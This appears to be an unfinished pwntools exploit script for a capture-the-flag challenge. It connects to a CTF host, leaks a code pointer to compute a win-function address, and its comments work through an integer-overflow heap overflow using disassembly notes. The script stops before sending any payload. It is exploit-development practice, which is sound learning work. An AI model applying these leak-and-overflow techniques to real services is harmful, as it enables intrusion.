from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

recv_menu()
p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'1')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'1')
p.recvuntil(b'data:\n')
p.send(b'A')
recv_menu()

p.sendline(b'3')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Validator    : ')
validator = int(p.recvline().strip(), 16)

base_addr = validator - 0x136c
win_func = base_addr + 0x14a8
print(f"Win function: {hex(win_func)}")

# 1. Allocate manifest 1 (the overflow chunk)
# size: 256 * 256 = 65536.
# malloc(1) will be called, but we read 65536 bytes.
# We want to overflow into what?
# Wait, if we overwrite `Validator` or `Checkpoint`, we need to know where they are.
# Wait, what exactly is the structure at `0x3740` (the array)?
# 1449: lea 0x22f0(%rip),%rax  # 3740
# 1450: add %r13,%rax          # %r13 = id << 4 (16 bytes per entry)
# 1453: mov %r15w,(%rax)       # item count (2 bytes)
# 1457: mov %r14w,0x2(%rax)    # item size (2 bytes)
# 145c: mov %r12,0x8(%rax)     # Checkpoint (heap ptr) (8 bytes)
# 1460: movl $0x1,0x4(%rax)    # Valid flag?
#
# Oh, the array is in `.bss` at 3740, not on the heap!
# Wait, the overflow is in the heap block (returned by malloc).
# Can we overwrite something on the heap?
# The heap block contains cargo data. Is there anything else on the heap?
p.close()
